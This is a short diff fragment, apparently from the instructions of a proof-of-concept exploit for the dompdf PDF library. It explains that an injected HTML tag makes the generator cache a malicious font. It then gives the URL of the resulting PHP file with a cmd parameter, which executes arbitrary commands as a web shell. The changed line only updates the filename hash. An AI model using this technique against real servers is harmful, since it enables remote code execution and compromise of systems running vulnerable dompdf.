@@ -5,7 +5,7 @@ inject this html tag to the pdf generator and it will access the exploit font th
 
 to access the cached font and execute any command you want
 
-[baseurl]/dompdf/lib/fonts/exploitfont_normal_4cbdc86ff75b10ac55846884a529e2f9.php?cmd=[command]
+[baseurl]/dompdf/lib/fonts/exploitfont_normal_474308190ce1ee929b1eede40de56ec7.php?cmd=[command]
 
 
 
